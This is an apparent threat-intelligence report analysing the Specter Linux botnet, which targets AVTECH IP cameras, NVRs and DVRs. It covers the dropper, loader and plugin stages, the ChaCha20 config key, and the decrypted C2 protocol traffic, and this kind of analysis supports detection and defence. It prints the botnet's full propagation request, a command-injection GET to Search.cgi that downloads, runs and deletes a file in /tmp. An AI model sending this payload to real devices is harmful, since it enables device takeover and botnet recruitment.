25 September 2020 / Botnet

Background
On August 20, 2020, 360Netlab Threat Detect System captured a suspicious ELF file
( 22523419f0404d628d02876e69458fbe.css )with 0 VT detection.
When we took a close look, we see a new botnet that targets AVTECH IP Camera / NVR /
DVR devices , and it has flexible configuration, highly modular / plugin, and uses TLS,
ChaCha20, Lz4 to encrypt and compress network traffic.
The ELF we captured is Dropper, it releases a loader, and the loader will send encrypted
traffic requests various Plugins from C2 to perform different functions. The sample build path
is /build/arm-specter-linux-uclibcgnueabi , that is why we named it Specter.
At present, Specter has a lot of unprofessional aspects . For example, it releases two
libraries required by runtime while releasing Loader, but they are all dynamically linked.We
also noticed that Plugin does not expand and load directly in memory.The vulnerability being
targeted is also quite old, a 5 years old on. On the other hand, this botnet has a good layered
design, complex network communication and some other characteristics，which is obviously
a work of professional. Professional aspects come with unprofessional aspects ,
this contradiction makes us speculate that Specter is in the test development stage. We will
see how it goes in the future.

Overview
Specter is a remote control Trojan (RAT) for the Linux platform.
It consists of 3 parts, Dropper, Loader, and Plugin. The main function is determined by
Loader&Plugin. The main functions of Specter are
File management
Download and upload management
Shell service
Socket5 Proxy
Report device information
1/14

Execute the script issued by C2
Executing C2 to deliver executable files
The basic process is shown in the figure below:

Propagation
Specter spread its Dropper samples throughAVTECH IP Camera / NVR / DVR Devices
vulnerabilities,The payload being used is as follows:
GET /cgi-bin/nobody/Search.cgi?
action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20
O%20/tmp/webstatus;chmod%20755%20/tmp/webstatus;/tmp/webstatus;rm%20f%20/tmp/webstatus;)&password=admin HTTP/1.1

Sample analysis
Specter's infection process can be divided into 4 stages.，
Stage 0: Preliminary stage, spread through vulnerabilities, implant Dropper on the
device
Stage 1: Dropper releases Loader
2/14

Stage 2: Loading stage, Loader loads Plugin
Stage 3: Plugin executes the instructions issued by C2

Stage1：Stage1: Release stage, Specter_Dropper analysis
The main function of the dropper is to detect the operating environment, decrypt the Loader,
configure the Config, and finally release and start the Loader.
MD5:a8400c378950084fc8ab80b8bb4e5b18
ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, stripped
Packer:No
1.1 Decrypt Loader
Decryption algorithm:XOR byte by byte 0x79 , then negate.

Along with the loaders, the runtime library, libc.so.0 and ld-uClibc.so.1 are also
decrypted.Currently these two libraries have no malicious functions, but we speculate that
future versions will hijack some functions of these two libraries to hide the existence of
Specter from file, process and networks’ perspectives
1.2 Configure Config
Look for the written position mark in the Loader sample SpctCF , and then write Config at its
subsequent address.。

The comparison is as follows:

3/14

1.3 Release and execute Loader
Release Loader to the /tmp/runtimes/hw_ex_watchdog file and run it, and later on delete
itself to clean up the traces of Dropper。

Stage2: Loading stage, Specter_Loader analysis
The main function of Loader is to decrypt Config, obtain C2 from it, establish encrypted
communication with C2, and execute the instructions issued by C2. If there is no Plugin for
processing the corresponding instructions, it will request the required Plugin from C2.

2.1 Decrypt Config
There are C2, mutex name, nonce and other information in the Config file, ChaCha20
encryption is used, where the key is CsFg34HbrJsAx6hjBmxDd7A2Wj0Cz9s\x00 and the
number of rounds is 15 .

The detailed Config structure is shown below:，

Take the Config in the above figure as an example, the nonce (12 bytes) required for
decryption is:
c1 f5 9e 20 7a 35 9d 25 ed 77 bb 70

The ciphertext is:

2.2 Establish communication with C2

5/14

The communication process can be divided into 4 stages, using TLS, ChaCha20 encryption
algorithm, lz4 compression algorithm to ensure the security of data communication.The first
stage is to establish a TLS connection, the second stage is the process of mutual agreement
authentication, the third stage is the Loader reporting device information, and the fourth
stage executes the C2 issuing instruction process.
TLS communication

In order to analyze the network traffic, we performed a Man-in-the-middle attack,and can see
the result as follows. It can be seen that Specter's network communication packet has a fixed
format.

Packets can be divided into four parts, the detailed structure is shown below:，

Where Encrypted Payload_info stores the payload verification, length, ID and other
info. [Encrypted?]Compressed Payload is the payload itself, the payload will only be
compressed during the key exchange stage, while in all the other stages it gets both

encrypted and compressed.
Let’s take a look at the above figure, the data packet that Bot sends to C2 for secret key
exchange
The encryption algorithm used in the first part( ncrypted Payload_info ) is:
ChaCha20
Key:
Nonce:

36 30 30 64 65 33 31 39 61 32 66 38 31 39 62 34
61 38 35 31 64 32 33 66 63 34 62 33 33 33 33 65
E7 66 29 FB 10 98 F6 5A 80 80 FF 58

The ciphertext is:
0F 41 01 FD 8B 75 6C A2 20 31 DC 35 70 D9 4D 3B 8E 53 4D E9

after decryption:
C9 3E 00 00 00 00 00 00 00 00 01 00 22 00 00 00 20 00 00 00
3EC9
0001
00000022
00000020

---- CRC16 of Payload
---- Cmd Id
Compressed Payload length
Decomressed Payload length

The value of Cmd Id is 1, indicating that it is in the key exchange stage, directly
decompress [Encrypted?]Compressed Payload and get the key sent by Bot to C2
01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10
11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20

Authentication

The protocol authentication process can be divided into two stages, the first stage is the key
exchange, and the second stage is the mutual recognition of identity.

7/14

According to the data packet decryption process introduced above, we will get.
The secret key sent by Bot to C2 is:
01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10
11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20

The secret key sent by C2 to Bot is:
19 F8 7C 62 7B 8D A2 B3 59 FD AE 25 4C 18 F7 33
96 B5 D9 F5 EC FF C2 07 C3 7C 87 53 AE 60 99 2C

In the secret key exchange phase, the payload is only compressed without encryption; after
the secret key is exchanged, Bot and C2 encrypt and compress the payload with each
other's secret key.
It can be solved with the above secret key.
The authentication information sent by Bot to C2 is:
00000000:

44 48 6E 37-34 73 64 50-4F 71 6E 53-64 32 35 39

DHn74sdPOqnSd259

The authentication information sent by C2 to Bot is:
00000000:

6C 30 53 4F-38 68 46 55-78 62 56 73-64 74 51 34

l0SO8hFUxbVsdtQ4

This is consistent with the implementation we saw in the sample:

2.3 Report device information, such as MAC/IP address, system type, etc.

8/14

2.4 Execute the start Plugin command issued by C2

9/14

Specter implements a very flexible plugin management communication mechanism, each
plugin must implement the following 4 methods,

If there is no corresponding Plugin currently, a request is made to C2 and finally dynamically
loaded into Loader Plugin Slot .

Stage3: Specter_Plugin analysis
When the bot gets the Plugin issued by C2, it cannot be used directly, because they are
encrypted and can only be loaded into the Plugin Slot for use after decryption.
Decryption algorithm: XOR 0x7f byte by byte, then negate

Here are some plugins we captured:
Shell plugin
